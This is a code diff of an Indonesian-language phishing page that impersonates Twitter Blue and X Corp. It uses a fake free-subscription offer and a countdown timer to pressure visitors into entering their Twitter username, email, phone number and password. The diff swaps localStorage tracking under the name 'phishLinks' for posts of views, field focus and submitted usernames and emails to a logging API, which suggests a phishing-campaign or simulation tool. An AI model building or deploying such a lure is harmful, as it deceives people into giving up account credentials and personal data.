@@ -6,299 +6,59 @@
     <title>Twitter Blue - Get Verified</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background: #1da1f2;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        .container {
-            background: white;
-            max-width: 600px;
-            width: 100%;
-            border-radius: 16px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-            overflow: hidden;
-        }
-
-        .header {
-            background: linear-gradient(135deg, #1da1f2 0%, #0d8bd9 100%);
-            padding: 40px 30px;
-            text-align: center;
-            color: white;
-        }
-
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #1da1f2; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .container { background: white; max-width: 600px; width: 100%; border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); overflow: hidden; }
+        .header { background: linear-gradient(135deg, #1da1f2 0%, #0d8bd9 100%); padding: 40px 30px; text-align: center; color: white; }
         .twitter-logo { font-size: 4rem; margin-bottom: 15px; }
         .header h1 { font-size: 2rem; margin-bottom: 10px; }
-        
-        .blue-badge {
-            background: white;
-            color: #1da1f2;
-            padding: 12px 25px;
-            border-radius: 50px;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            font-weight: bold;
-            margin-top: 15px;
-            animation: bounce 1s infinite;
-        }
-
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-5px); }
-        }
-
+        .blue-badge { background: white; color: #1da1f2; padding: 12px 25px; border-radius: 50px; display: inline-flex; align-items: center; gap: 8px; font-weight: bold; margin-top: 15px; }
         .content { padding: 30px; }
-
-        .promo-box {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 25px;
-            border-radius: 12px;
-            text-align: center;
-            margin-bottom: 25px;
-        }
-
+        .promo-box { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 25px; border-radius: 12px; text-align: center; margin-bottom: 25px; }
         .promo-box h2 { font-size: 1.5rem; margin-bottom: 10px; }
-
-        .benefits {
-            background: #f7f9fa;
-            padding: 20px;
-            border-radius: 12px;
-            margin-bottom: 25px;
-        }
-
+        .benefits { background: #f7f9fa; padding: 20px; border-radius: 12px; margin-bottom: 25px; }
         .benefits h3 { color: #14171a; margin-bottom: 15px; }
-        
-        .benefit-item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 12px 0;
-            border-bottom: 1px solid #e1e8ed;
-        }
-
-        .benefit-item:last-child { border-bottom: none; }
-        .benefit-item .icon { color: #1da1f2; font-size: 1.3rem; }
-
-        .timer-box {
-            background: #fff3cd;
-            border: 2px solid #ffc107;
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-            margin-bottom: 25px;
-        }
-
-        .timer-box strong { color: #856404; display: block; margin-bottom: 10px; }
+        .benefit-item { display: flex; align-items: center; gap: 12px; padding: 12px 0; border-bottom: 1px solid #e1e8ed; }
+        .timer-box { background: #fff3cd; border: 2px solid #ffc107; padding: 15px; border-radius: 10px; text-align: center; margin-bottom: 25px; }
         .timer-box .time { font-size: 2rem; color: #dc3545; font-weight: bold; font-family: monospace; }
-
-        .form-section {
-            background: #f7f9fa;
-            padding: 25px;
-            border-radius: 12px;
-        }
-
-        .form-section h3 { text-align: center; color: #14171a; margin-bottom: 20px; }
-
+        .form-section { background: #f7f9fa; padding: 25px; border-radius: 12px; }
         .form-group { margin-bottom: 15px; }
-        .form-group label { display: block; color: #14171a; font-weight: 600; margin-bottom: 6px; font-size: 0.9rem; }
-        .form-group input {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #e1e8ed;
-            border-radius: 8px;
-            font-size: 1rem;
-        }
-
-        .form-group input:focus {
-            outline: none;
-            border-color: #1da1f2;
-        }
-
-        .btn-subscribe {
-            width: 100%;
-            padding: 14px;
-            background: #1da1f2;
-            color: white;
-            border: none;
-            border-radius: 50px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 15px;
-            transition: all 0.3s;
-        }
-
-        .btn-subscribe:hover {
-            background: #0d8bd9;
-            transform: translateY(-2px);
-        }
-
-        .footer {
-            background: #f7f9fa;
-            padding: 20px;
-            text-align: center;
-            font-size: 0.85rem;
-            color: #657786;
-        }
+        .form-group label { display: block; color: #14171a; font-weight: 600; margin-bottom: 6px; }
+        .form-group input { width: 100%; padding: 12px; border: 2px solid #e1e8ed; border-radius: 8px; font-size: 1rem; }
+        .form-group input:focus { outline: none; border-color: #1da1f2; }
+        .btn-subscribe { width: 100%; padding: 14px; background: #1da1f2; color: white; border: none; border-radius: 50px; font-size: 1.1rem; font-weight: bold; cursor: pointer; margin-top: 15px; }
+        .footer { background: #f7f9fa; padding: 20px; text-align: center; font-size: 0.85rem; color: #657786; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <div class="twitter-logo">𝕏</div>
-            <h1>Twitter Blue</h1>
-            <p style="font-size: 1.1rem;">Premium Verification</p>
-            <div class="blue-badge">
-                ✓ Get Verified
-            </div>
-        </div>
-
+        <div class="header"><div class="twitter-logo">𝕏</div><h1>Twitter Blue</h1><p style="font-size:1.1rem;">Premium Verification</p><div class="blue-badge">✓ Get Verified</div></div>
         <div class="content">
-            <div class="promo-box">
-                <h2>🎉 PROMO SPESIAL!</h2>
-                <p style="font-size: 1.1rem;">GRATIS Twitter Blue selama 1 tahun</p>
-                <p style="margin-top: 8px; font-size: 0.9rem;">Hemat Rp 2.000.000</p>
-            </div>
-
-            <div class="benefits">
-                <h3>✨ Keuntungan Twitter Blue:</h3>
-                <div class="benefit-item">
-                    <span class="icon">✓</span>
-                    <span>Centang biru verifikasi</span>
-                </div>
-                <div class="benefit-item">
-                    <span class="icon">✓</span>
-                    <span>Edit tweet setelah posting</span>
-                </div>
-                <div class="benefit-item">
-                    <span class="icon">✓</span>
-                    <span>Tweet sampai 25,000 karakter</span>
-                </div>
-                <div class="benefit-item">
-                    <span class="icon">✓</span>
-                    <span>Upload video 4K</span>
-                </div>
-                <div class="benefit-item">
-                    <span class="icon">✓</span>
-                    <span>Prioritas di balasan & pencarian</span>
-                </div>
-            </div>
-
-            <div class="timer-box">
-                <strong>⏰ PENAWARAN BERAKHIR:</strong>
-                <div class="time" id="timer">23:59</div>
-            </div>
-
-            <div class="form-section">
-                <h3>🎯 CLAIM TWITTER BLUE GRATIS</h3>
+            <div class="promo-box"><h2>🎉 PROMO SPESIAL!</h2><p style="font-size:1.1rem;">GRATIS Twitter Blue selama 1 tahun</p></div>
+            <div class="benefits"><h3>✨ Keuntungan Twitter Blue:</h3><div class="benefit-item"><span style="color:#1da1f2;">✓</span><span>Centang biru verifikasi</span></div><div class="benefit-item"><span style="color:#1da1f2;">✓</span><span>Edit tweet setelah posting</span></div></div>
+            <div class="timer-box"><strong style="color:#856404;display:block;margin-bottom:10px;">⏰ PENAWARAN BERAKHIR:</strong><div class="time" id="timer">23:59</div></div>
+            <div class="form-section"><h3 style="text-align:center;margin-bottom:20px;">🎯 CLAIM TWITTER BLUE GRATIS</h3>
                 <form id="subscribeForm">
-                    <div class="form-group">
-                        <label>Username Twitter</label>
-                        <input type="text" id="username" placeholder="@username" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Email</label>
-                        <input type="email" id="email" placeholder="email@example.com" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Nomor Telepon</label>
-                        <input type="tel" id="phone" placeholder="08xxxxxxxxxx" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Password Twitter</label>
-                        <input type="password" id="password" placeholder="Masukkan password" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Jumlah Followers</label>
-                        <input type="number" id="followers" placeholder="Contoh: 5000" required>
-                    </div>
-                    <button type="submit" class="btn-subscribe">
-                        🚀 SUBSCRIBE TWITTER BLUE
-                    </button>
+                    <div class="form-group"><label>Username Twitter</label><input type="text" id="username" required></div>
+                    <div class="form-group"><label>Email</label><input type="email" id="email" required></div>
+                    <div class="form-group"><label>Nomor Telepon</label><input type="tel" id="phone" required></div>
+                    <div class="form-group"><label>Password Twitter</label><input type="password" id="password" required></div>
+                    <button type="submit" class="btn-subscribe">🚀 SUBSCRIBE TWITTER BLUE</button>
                 </form>
             </div>
         </div>
-
-        <div class="footer">
-            <p><strong>Twitter / X Corp</strong></p>
-            <p>© 2024 X Corp. All rights reserved.</p>
-        </div>
+        <div class="footer"><p><strong>Twitter / X Corp</strong></p><p>© 2024 X Corp.</p></div>
     </div>
-
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const linkId = urlParams.get('id') || 'demo';
-
-        function trackView() {
-            let links = JSON.parse(localStorage.getItem('phishLinks') || '[]');
-            const link = links.find(l => l.id === linkId);
-            if (link) {
-                link.views = (link.views || 0) + 1;
-                if (!link.visitors) link.visitors = [];
-                const visitorId = Date.now();
-                link.visitors.push({ id: visitorId, timestamp: Date.now(), duration: 0, inputData: false });
-                links[links.findIndex(l => l.id === linkId)] = link;
-                localStorage.setItem('phishLinks', JSON.stringify(links));
-                sessionStorage.setItem('visitorId', visitorId);
-                sessionStorage.setItem('linkId', linkId);
-                sessionStorage.setItem('startTime', Date.now());
-            }
-        }
-
-        let time = 1439;
-        setInterval(() => {
-            const m = Math.floor(time / 60);
-            const s = time % 60;
-            document.getElementById('timer').textContent = `${m}:${s.toString().padStart(2, '0')}`;
-            time--; if (time < 0) time = 1439;
-        }, 1000);
-
-        document.getElementById('subscribeForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            let links = JSON.parse(localStorage.getItem('phishLinks') || '[]');
-            const link = links.find(l => l.id === linkId);
-            if (link) {
-                link.inputData = (link.inputData || 0) + 1;
-                const visitorId = sessionStorage.getItem('visitorId');
-                const visitor = link.visitors.find(v => v.id == visitorId);
-                if (visitor) {
-                    visitor.inputData = true;
-                    visitor.duration = Math.floor((Date.now() - parseInt(sessionStorage.getItem('startTime'))) / 1000);
-                }
-                links[links.findIndex(l => l.id === linkId)] = link;
-                localStorage.setItem('phishLinks', JSON.stringify(links));
-            }
-            const btn = e.target.querySelector('.btn-subscribe');
-            btn.textContent = '⏳ Processing...';
-            btn.disabled = true;
-            setTimeout(() => window.location.href = 'index.html', 2000);
-        });
-
-        trackView();
-        window.addEventListener('beforeunload', () => {
-            const vid = sessionStorage.getItem('visitorId');
-            const lid = sessionStorage.getItem('linkId');
-            const st = parseInt(sessionStorage.getItem('startTime'));
-            if (vid && lid && st) {
-                const dur = Math.floor((Date.now() - st) / 1000);
-                let links = JSON.parse(localStorage.getItem('phishLinks') || '[]');
-                const link = links.find(l => l.id === lid);
-                if (link) {
-                    const v = link.visitors.find(vv => vv.id == vid);
-                    if (v && !v.inputData) v.duration = dur;
-                    links[links.findIndex(l => l.id === lid)] = link;
-                    localStorage.setItem('phishLinks', JSON.stringify(links));
-                }
-            }
-        });
+        const API_URL = 'http://localhost:5000/api';
+        const linkId = new URLSearchParams(window.location.search).get('id');
+        async function trackView() { if (!linkId) return; try { await fetch(\`\${API_URL}/log-activity\`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'view', data: 'Twitter Blue page opened' }) }); } catch (e) {} }
+        async function trackClick(f) { if (!linkId) return; try { await fetch(\`\${API_URL}/log-activity\`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'click', data: \`Field: \${f}\` }) }); } catch (e) {} }
+        async function trackSubmit(d) { if (!linkId) return; try { await fetch(\`\${API_URL}/log-activity\`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ link_id: linkId, activity_type: 'submit', data: JSON.stringify(d) }) }); } catch (e) {} }
+        let time = 1439; setInterval(() => { const m = Math.floor(time / 60), s = time % 60; document.getElementById('timer').textContent = \`\${m}:\${s.toString().padStart(2,'0')}\`; time--; if (time < 0) time = 1439; }, 1000);
+        let c = new Set();
+        document.querySelectorAll('input').forEach(i => i.addEventListener('focus', function() { const n = this.id; if (!c.has(n)) { c.add(n); trackClick(n); } }));
+        document.getElementById('subscribeForm').addEventListener('submit', async function(e) { e.preventDefault(); await trackSubmit({ username: document.getElementById('username').value, email: document.getElementById('email').value }); const btn = e.target.querySelector('.btn-subscribe'); btn.textContent = '⏳ Processing...'; btn.disabled = true; setTimeout(() => window.location.href = 'index.html', 2000); });
+        window.addEventListener('DOMContentLoaded', trackView);
     </script>
 </body>
 </html>
